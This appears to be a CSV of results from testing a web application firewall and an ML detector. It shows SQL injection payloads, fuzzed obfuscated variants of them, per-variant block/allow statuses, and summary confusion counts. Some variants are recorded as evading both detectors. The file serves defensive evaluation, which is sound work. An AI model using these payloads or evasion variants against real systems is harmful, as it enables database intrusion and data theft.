Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
45,2024-12-16T21:58:40.638145,"1',extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   ",403,403,200,waf_correct_ml_incorrect,"0x1',extractvalue  ( /**/9788,concat  (  0x5c,0x7171706a71,  (  sELeCT   (  elt  (   OR 0   lIke   9788,7759 Like 7759   )    )     )  ,0x717a767a71   )    )  
",2024-12-16T21:58:47.287581,403,200,waf_correct_ml_incorrect,"0x1',extractvalue  (  (sElecT 9788),concat  (  0x5c,0x7171706a71,  (  sELeCT   (  elt  (   OR 9732 liKE 9732   LIke    AND 1,7759	lIkE 7759   )    )     )  ,0x717a767a71   )    )  
",2024-12-16T21:58:55.751347,200,200,both_incorrect,"0x1',extractvalue  (  (sElEcT  || 0),concat  (  0x5c,0x7171706a71,  (  sElEcT   (  elt  (   Or 0x101c NOT LIKE 4125 LiKE 9732   liKe    aNd 1,7759
LiKE 7759   )    )     )  ,0x717a767a71  /*~7qwZ*/)    )  
",2024-12-16T21:59:05.227408,200,200,both_incorrect,"0x1',extractvalue  (  (sElEcT  || 0),concat  (  0x5c,0x7171706a71,  (  sElEcT   (  elt  (   Or 0x101c NOT LIKE 4125 LiKE 9732   liKe    aNd '-1 liKE t' NOT LIKE '-1=tr', OR 0	LIKe (sELeCt 7759)   ) /**/  )     )  ,0x717a767a71  /*~7qwZ*/)    )  
",2024-12-16T21:59:16.143522,200,200,both_incorrect,"0x1',extractvalue  (  (sElEcT  || 0),concat  (  0x5c,0x7171706a71,  (  sElEcT   (  elt  (   Or 0x101c NOT LIKE 4125 LiKE 9732   liKe    aNd '-1 LIke t' NOT LIKE '-'V' NOT LIKE 'VO'=tr', || 0	LIKe (sELECt (SelECT (SeLeCt 1)))   )    )     )  ,0x717a767a71  /**/)    )   ",2024-12-16T21:59:28.609889,200,200,both_incorrect
46,2024-12-16T21:59:42.304978,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'aduc'  =  'aduc",403,403,403,both_correct," aNd 7079 IN (7078,7079,7080)'  	)    )     )   or/*|2?*/row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 0x15d0 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'aduc'  =  'aduc",2024-12-16T21:59:58.760499,403,403,both_correct," And 7079 in ('P'='P',7079,7080)'  
)    )     )   or/*|2?*/row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   OR 0  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  (SELECT 0)  )  *2   )    )   x from   (  select 8488 union select/**/0x15d0 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'aduc'  =  'aduc",2024-12-16T22:00:17.585887,403,403,both_correct," AND 'Z'='Z' iN ('P' lIkE 'P',7079,7080)'   )    )     )   or/*|2?*/row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   OR  AND 1  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  (SELECT 0)  )  *2   )    )   x from   (  select 8488 union select 0x15d0 union select 3051 union select (SELECT 1210)  )  a group by x  )   and    (    (     (  'aduc'  =  'aduc",2024-12-16T22:00:37.681924,403,403,both_correct," and 'Z' LIKE 'Z' in ('P' liKe 'P', AND 1,7080)'   )    )     )   or/*|2?*/row  (  1045,7562  )  >
 (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   OR  AND 1  =  ','=',',1   )    )     )  ,0x717a767a71,floor  (  rand  (  (SELECT 0) /**/)  *0x2   )    )   x from   (  select 8488 union select 0x15d0 union select 3051 union select (SELECT 1210)  )  a group by x  )   and    (    (     (  'aduc'  =  'aduc",2024-12-16T22:00:58.610329,403,403,both_correct," ANd 'Z' Like 'Z' iN ('P' LikE 'P', && (SELeCt 1),(SeleCT 7080))'   )    )     )/**/  or/*|2?*/row  (  'H'x""' LIkE 'H'x""',7562  )  >	 (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   OR  AND 1  =  ','=',',1   )    )     )  ,0x717a767a71,floor  (  rand  (  (SELECT 0) /*""N2Zh*/)  *0x2   )    )   x FROM   (  SeleCt 8488 union SElecT 0x15d0 union SELeCT 3051 union SelEcT (seLEct 1210)  )  a group by x  )   And    (    (     (  'aduc'  =  'aduc",2024-12-16T22:01:20.559631,403,403,both_correct
47,2024-12-16T22:01:43.879140,clara,200,200,200,both_correct,clara,2024-12-16T22:01:44.250682,200,200,both_correct,clara,2024-12-16T22:01:45.610809,200,200,both_correct,clara,2024-12-16T22:01:46.985904,200,200,both_correct,clara,2024-12-16T22:01:48.353285,200,200,both_correct,clara,2024-12-16T22:01:49.721932,200,200,both_correct
48,2024-12-16T22:01:51.086927,alcoleja,200,200,200,both_correct,alcoleja,2024-12-16T22:01:51.578399,200,200,both_correct,alcoleja,2024-12-16T22:01:53.073035,200,200,both_correct,alcoleja,2024-12-16T22:01:54.592945,200,200,both_correct,alcoleja,2024-12-16T22:01:56.110655,200,200,both_correct,alcoleja,2024-12-16T22:01:57.613675,200,200,both_correct
49,2024-12-16T22:01:59.149581,astor,200,200,200,both_correct,astor,2024-12-16T22:01:59.507513,200,200,both_correct,astor,2024-12-16T22:02:00.878991,200,200,both_correct,astor,2024-12-16T22:02:02.249465,200,200,both_correct,astor,2024-12-16T22:02:03.632212,200,200,both_correct,astor,2024-12-16T22:02:05.003764,200,200,both_correct
50,2024-12-16T22:02:06.376703,av. bayona 127 1?c,200,200,200,both_correct,"av. bayona/**/ aND 0x223b in (8762,8763,8764)
1?c",2024-12-16T22:02:07.346971,200,403,waf_correct_ml_incorrect,"av. bayona/**/ anD 0x223b IN (8762,(SElect 8763), ANd/**/1) '>' LiKe '>'?c",2024-12-16T22:02:10.758651,403,200,waf_incorrect_ml_correct,"av. bayona/*:+l*/ AND	0x223b iN (8762,(SelECT 0x223b), aNd  aNd '6' lIKe '6') '>' likE '>'?c",2024-12-16T22:02:15.675517,200,200,both_correct,"av. bayona/*EF*/ && 0x223b In ( OR 0,(SeleCT 0x223b), And  AnD ''8s' NOT LIKE/**/'8s5'' LiKe '0x6') '>' like '>'?c",2024-12-16T22:02:21.205119,403,200,waf_incorrect_ml_correct,"av. bayona/*EF*/ &&
0x223b in ( || 0x0,(SElECt 0x223b), And/**/ aND ''8s' NOT LIKE/**/'8s5'' lIKe '0x6') '>' lIkE '>'?c",2024-12-16T22:02:27.787486,403,200,waf_incorrect_ml_correct

Overall Results
WAF TP,151
WAF TN,104
WAF FP,16
WAF FN,29
ML TP,104
ML TN,103
ML FP,17
ML FN,76

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,187,20
ML Incorrect,68,25
